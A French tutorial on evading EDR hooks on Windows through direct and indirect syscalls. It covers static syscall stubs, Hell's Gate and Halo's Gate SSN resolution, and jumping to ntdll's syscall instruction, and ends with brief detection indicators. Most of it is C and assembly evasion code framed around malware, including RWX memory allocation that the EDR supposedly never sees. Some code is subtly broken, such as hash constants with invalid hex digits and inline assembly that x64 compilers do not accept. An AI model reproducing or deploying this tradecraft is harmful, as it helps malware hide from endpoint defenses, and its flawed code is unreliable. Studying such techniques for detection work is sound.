# Direct Syscalls - Contourner les hooks EDR

## Introduction

Les **EDR** (Endpoint Detection and Response) placent des **hooks** sur les fonctions de `ntdll.dll` pour surveiller les appels système. En appelant les syscalls directement, on bypass complètement ces hooks.

```
┌─────────────────────────────────────────────────────────────────────┐
│                    APPEL NORMAL (HOOKABLE)                         │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│   Malware.exe                                                       │
│       │                                                             │
│       ▼                                                             │
│   kernel32.dll (VirtualAlloc)                                       │
│       │                                                             │
│       ▼                                                             │
│   ntdll.dll (NtAllocateVirtualMemory) ◄── HOOK EDR ICI !           │
│       │                                 │                           │
│       │                                 ▼                           │
│       │                            EDR inspecte                     │
│       │                            les paramètres                   │
│       ▼                                                             │
│   SYSCALL → Kernel                                                  │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────┐
│                    DIRECT SYSCALL (BYPASS)                          │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│   Malware.exe                                                       │
│       │                                                             │
│       │  (On skip ntdll.dll complètement !)                        │
│       │                                                             │
│       ▼                                                             │
│   SYSCALL → Kernel                                                  │
│                                                                     │
│   L'EDR ne voit RIEN car son hook n'est pas appelé                 │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Comment fonctionne un syscall ?

### Structure d'une fonction ntdll

```asm
; NtAllocateVirtualMemory dans ntdll.dll (Windows 10)
NtAllocateVirtualMemory:
    mov r10, rcx                ; Copier 1er argument
    mov eax, 18h                ; Numéro du syscall (varie selon Windows)
    syscall                     ; Appel au kernel
    ret
```

Le numéro de syscall (SSN - System Service Number) **change selon la version de Windows**.

### Table des syscalls (exemples)

| Fonction | Win7 | Win10 1909 | Win10 21H2 | Win11 |
|----------|------|------------|------------|-------|
| NtAllocateVirtualMemory | 0x15 | 0x18 | 0x18 | 0x18 |
| NtProtectVirtualMemory | 0x4D | 0x50 | 0x50 | 0x50 |
| NtWriteVirtualMemory | 0x37 | 0x3A | 0x3A | 0x3A |
| NtCreateThreadEx | 0xA5 | 0xC1 | 0xC2 | 0xC7 |

---

## Technique 1 : Syscalls statiques

On hardcode les numéros de syscall (simple mais pas portable).

```c
#include <windows.h>
#include <stdio.h>

// Définir les prototypes
typedef NTSTATUS (NTAPI* NtAllocateVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

// Stub assembleur pour le syscall direct
// Windows 10 21H2 : NtAllocateVirtualMemory = 0x18
__declspec(naked) NTSTATUS NtAllocateVirtualMemory_Syscall(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
) {
    __asm {
        mov r10, rcx
        mov eax, 0x18           ; SSN pour NtAllocateVirtualMemory
        syscall
        ret
    }
}

int main() {
    PVOID baseAddress = NULL;
    SIZE_T regionSize = 4096;
    NTSTATUS status;

    // Appeler directement le syscall
    status = NtAllocateVirtualMemory_Syscall(
        GetCurrentProcess(),
        &baseAddress,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (status == 0) {  // STATUS_SUCCESS
        printf("[+] Mémoire allouée à : 0x%p\n", baseAddress);
    } else {
        printf("[-] Échec : 0x%X\n", status);
    }

    return 0;
}
```

---

## Technique 2 : Hell's Gate - Résolution dynamique des SSN

**Hell's Gate** lit les numéros de syscall directement depuis ntdll.dll en mémoire.

### Principe

1. Parser ntdll.dll en mémoire (déjà chargée)
2. Trouver la fonction Nt* dans l'Export Address Table
3. Lire le SSN dans les premiers octets (mov eax, XXh)

### Implémentation complète

```c
#include <windows.h>
#include <stdio.h>

// Structure pour stocker les infos d'un syscall
typedef struct _VX_TABLE_ENTRY {
    PVOID   pAddress;       // Adresse de la fonction
    DWORD   dwHash;         // Hash du nom
    WORD    wSyscall;       // Numéro du syscall
} VX_TABLE_ENTRY, *PVX_TABLE_ENTRY;

// Table de syscalls
typedef struct _VX_TABLE {
    VX_TABLE_ENTRY NtAllocateVirtualMemory;
    VX_TABLE_ENTRY NtProtectVirtualMemory;
    VX_TABLE_ENTRY NtWriteVirtualMemory;
    VX_TABLE_ENTRY NtCreateThreadEx;
    VX_TABLE_ENTRY NtWaitForSingleObject;
} VX_TABLE, *PVX_TABLE;

// Fonction de hashing (djb2)
DWORD HashString(const char* str) {
    DWORD hash = 5381;
    int c;
    while ((c = *str++)) {
        hash = ((hash << 5) + hash) + c;
    }
    return hash;
}

// Hashes pré-calculés
#define NtAllocateVirtualMemory_Hash    0x1234ABCD  // Calculer avec HashString
#define NtProtectVirtualMemory_Hash     0x5678EFGH
#define NtWriteVirtualMemory_Hash       0x9ABCIJKL
#define NtCreateThreadEx_Hash           0xDEF0MNOP

/**
 * GetSSN - Extrait le numéro de syscall d'une fonction ntdll
 *
 * La fonction Nt* non hookée ressemble à :
 *   4C 8B D1        mov r10, rcx
 *   B8 XX 00 00 00  mov eax, XX   <- SSN ici !
 *   ...
 *
 * Si hookée par EDR, les premiers bytes seront différents (JMP ...)
 */
BOOL GetSSN(PVOID pFunctionAddress, PWORD pSSN) {
    BYTE* pFunc = (BYTE*)pFunctionAddress;

    // Vérifier le pattern normal (non hooké)
    // 4C 8B D1 = mov r10, rcx
    // B8 XX 00 00 00 = mov eax, XX
    if (pFunc[0] == 0x4C && pFunc[1] == 0x8B && pFunc[2] == 0xD1 &&
        pFunc[3] == 0xB8) {
        // Le SSN est à l'offset 4
        *pSSN = *(WORD*)(pFunc + 4);
        return TRUE;
    }

    // Pattern alternatif avec syscall inline
    if (pFunc[0] == 0xB8) {
        *pSSN = *(WORD*)(pFunc + 1);
        return TRUE;
    }

    // Fonction hookée - pattern JMP
    if (pFunc[0] == 0xE9 || pFunc[0] == 0xEB) {
        printf("[!] Fonction hookée détectée !\n");
        return FALSE;
    }

    return FALSE;
}

/**
 * InitHellsGate - Initialise la table de syscalls
 */
BOOL InitHellsGate(PVX_TABLE pTable) {
    // Récupérer le handle de ntdll.dll (toujours chargée)
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf("[-] ntdll.dll non trouvée\n");
        return FALSE;
    }

    // Parser le PE header
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + pDosHeader->e_lfanew);

    // Récupérer l'Export Directory
    DWORD exportDirRVA = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hNtdll + exportDirRVA);

    // Tables d'export
    PDWORD pAddressOfFunctions = (PDWORD)((BYTE*)hNtdll + pExportDir->AddressOfFunctions);
    PDWORD pAddressOfNames = (PDWORD)((BYTE*)hNtdll + pExportDir->AddressOfNames);
    PWORD pAddressOfNameOrdinals = (PWORD)((BYTE*)hNtdll + pExportDir->AddressOfNameOrdinals);

    // Parcourir toutes les fonctions exportées
    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
        char* szFunctionName = (char*)((BYTE*)hNtdll + pAddressOfNames[i]);
        PVOID pFunctionAddress = (PVOID)((BYTE*)hNtdll + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);

        // On ne s'intéresse qu'aux fonctions Nt*
        if (szFunctionName[0] != 'N' || szFunctionName[1] != 't') {
            continue;
        }

        DWORD hash = HashString(szFunctionName);

        // Chercher nos fonctions d'intérêt
        if (strcmp(szFunctionName, "NtAllocateVirtualMemory") == 0) {
            pTable->NtAllocateVirtualMemory.pAddress = pFunctionAddress;
            pTable->NtAllocateVirtualMemory.dwHash = hash;
            GetSSN(pFunctionAddress, &pTable->NtAllocateVirtualMemory.wSyscall);
            printf("[+] NtAllocateVirtualMemory : SSN = 0x%X\n", pTable->NtAllocateVirtualMemory.wSyscall);
        }
        else if (strcmp(szFunctionName, "NtProtectVirtualMemory") == 0) {
            pTable->NtProtectVirtualMemory.pAddress = pFunctionAddress;
            pTable->NtProtectVirtualMemory.dwHash = hash;
            GetSSN(pFunctionAddress, &pTable->NtProtectVirtualMemory.wSyscall);
            printf("[+] NtProtectVirtualMemory : SSN = 0x%X\n", pTable->NtProtectVirtualMemory.wSyscall);
        }
        else if (strcmp(szFunctionName, "NtWriteVirtualMemory") == 0) {
            pTable->NtWriteVirtualMemory.pAddress = pFunctionAddress;
            pTable->NtWriteVirtualMemory.dwHash = hash;
            GetSSN(pFunctionAddress, &pTable->NtWriteVirtualMemory.wSyscall);
            printf("[+] NtWriteVirtualMemory : SSN = 0x%X\n", pTable->NtWriteVirtualMemory.wSyscall);
        }
        else if (strcmp(szFunctionName, "NtCreateThreadEx") == 0) {
            pTable->NtCreateThreadEx.pAddress = pFunctionAddress;
            pTable->NtCreateThreadEx.dwHash = hash;
            GetSSN(pFunctionAddress, &pTable->NtCreateThreadEx.wSyscall);
            printf("[+] NtCreateThreadEx : SSN = 0x%X\n", pTable->NtCreateThreadEx.wSyscall);
        }
    }

    return TRUE;
}

// Variable globale pour stocker le SSN courant
WORD wSyscallNumber;

/**
 * HellsGate - Configure le SSN pour le prochain syscall
 */
void HellsGate(WORD wSSN) {
    wSyscallNumber = wSSN;
}

/**
 * HellDescent - Exécute le syscall avec le SSN configuré
 */
__declspec(naked) NTSTATUS HellDescent(...) {
    __asm {
        mov r10, rcx
        mov eax, wSyscallNumber
        syscall
        ret
    }
}

// Exemple d'utilisation
int main() {
    VX_TABLE vxTable = { 0 };
    PVOID baseAddress = NULL;
    SIZE_T regionSize = 4096;
    NTSTATUS status;

    printf("[*] Initialisation Hell's Gate...\n\n");

    if (!InitHellsGate(&vxTable)) {
        printf("[-] Échec de l'initialisation\n");
        return 1;
    }

    printf("\n[*] Allocation mémoire via syscall direct...\n");

    // Configurer le SSN
    HellsGate(vxTable.NtAllocateVirtualMemory.wSyscall);

    // Appeler le syscall
    status = HellDescent(
        GetCurrentProcess(),
        &baseAddress,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (status == 0) {
        printf("[+] Mémoire RWX allouée à : 0x%p\n", baseAddress);
        printf("[+] L'EDR n'a rien vu !\n");
    }

    return 0;
}
```

---

## Technique 3 : Halo's Gate - Contourner les hooks

Si une fonction est hookée, **Halo's Gate** cherche le SSN dans les fonctions voisines.

```c
/**
 * GetSSN_HalosGate - Trouve le SSN même si la fonction est hookée
 *
 * Stratégie : Les fonctions Nt* sont ordonnées par SSN.
 * Si NtXxx a SSN=0x18, alors la fonction juste avant a SSN=0x17
 */
BOOL GetSSN_HalosGate(PVOID pFunctionAddress, PWORD pSSN) {
    BYTE* pFunc = (BYTE*)pFunctionAddress;

    // D'abord essayer la méthode normale
    if (pFunc[0] == 0x4C && pFunc[1] == 0x8B && pFunc[2] == 0xD1) {
        *pSSN = *(WORD*)(pFunc + 4);
        return TRUE;
    }

    // Fonction hookée - chercher dans les voisines
    printf("[!] Fonction hookée, recherche dans les voisines...\n");

    // Chercher vers le haut (fonctions précédentes)
    for (WORD offset = 1; offset <= 32; offset++) {
        // Chaque stub syscall fait 32 bytes
        BYTE* pNeighbor = pFunc - (offset * 32);

        if (pNeighbor[0] == 0x4C && pNeighbor[1] == 0x8B && pNeighbor[2] == 0xD1) {
            WORD neighborSSN = *(WORD*)(pNeighbor + 4);
            *pSSN = neighborSSN + offset;  // Notre SSN = voisin + distance
            printf("[+] SSN trouvé via voisin (offset -%d) : 0x%X\n", offset, *pSSN);
            return TRUE;
        }
    }

    // Chercher vers le bas (fonctions suivantes)
    for (WORD offset = 1; offset <= 32; offset++) {
        BYTE* pNeighbor = pFunc + (offset * 32);

        if (pNeighbor[0] == 0x4C && pNeighbor[1] == 0x8B && pNeighbor[2] == 0xD1) {
            WORD neighborSSN = *(WORD*)(pNeighbor + 4);
            *pSSN = neighborSSN - offset;
            printf("[+] SSN trouvé via voisin (offset +%d) : 0x%X\n", offset, *pSSN);
            return TRUE;
        }
    }

    printf("[-] Impossible de trouver le SSN\n");
    return FALSE;
}
```

---

## Technique 4 : Indirect Syscalls

Les EDR modernes détectent les syscalls exécutés depuis des régions mémoire non-ntdll.

**Solution** : Exécuter l'instruction `syscall` depuis ntdll.dll elle-même !

```c
/**
 * Indirect Syscall - Exécute syscall depuis ntdll.dll
 *
 * Au lieu d'avoir notre propre instruction "syscall",
 * on saute vers l'instruction syscall dans ntdll.dll
 */

// Trouver une instruction "syscall; ret" dans ntdll
PVOID FindSyscallInstruction(HMODULE hNtdll) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + pDos->e_lfanew);

    // Trouver la section .text
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)pSection[i].Name, ".text") == 0) {
            BYTE* pStart = (BYTE*)hNtdll + pSection[i].VirtualAddress;
            DWORD dwSize = pSection[i].Misc.VirtualSize;

            // Chercher le pattern : 0F 05 C3 (syscall; ret)
            for (DWORD j = 0; j < dwSize - 3; j++) {
                if (pStart[j] == 0x0F && pStart[j+1] == 0x05 && pStart[j+2] == 0xC3) {
                    return &pStart[j];
                }
            }
        }
    }
    return NULL;
}

// Variable globale pour l'adresse de syscall
PVOID pSyscallAddr;

// Stub indirect syscall
__declspec(naked) NTSTATUS IndirectSyscall(...) {
    __asm {
        mov r10, rcx
        mov eax, wSyscallNumber
        jmp pSyscallAddr          // Sauter vers syscall dans ntdll !
    }
}
```

---

## Outils existants

| Outil | Description |
|-------|-------------|
| [SysWhispers2](https://github.com/jthuraisamy/SysWhispers2) | Génère des stubs syscall en ASM |
| [SysWhispers3](https://github.com/klezVirus/SysWhispers3) | Version améliorée avec egg hunting |
| [Hell's Gate](https://github.com/am0nsec/HellsGate) | Implémentation de référence |
| [Halo's Gate](https://blog.sektor7.net/#!res/2021/halosgate.md) | Contournement des hooks |

---

## Détection

```
Indicateurs pour les défenseurs :

1. Syscalls depuis mémoire non-ntdll
   → Vérifier return address du syscall

2. Lectures suspectes de ntdll en mémoire
   → Monitoring des accès mémoire

3. Absence d'appels ntdll dans les logs
   → Si une allocation est faite sans appel NtAllocate...

4. Patterns d'assembleur connus
   → Signatures pour SysWhispers, Hell's Gate
```

---

## Références

- [Hell's Gate Paper](https://vxug.fakedoma.in/papers/VXUG/Exclusive/HellsGate.pdf)
- [SysWhispers2](https://github.com/jthuraisamy/SysWhispers2)
- [Direct Syscalls - ired.team](https://www.ired.team/offensive-security/defense-evasion/using-syscalls-directly-from-visual-studio-to-bypass-avs-edrs)
- [DEF CON 31 - Syscalls Workshop](https://github.com/VX-Underground)
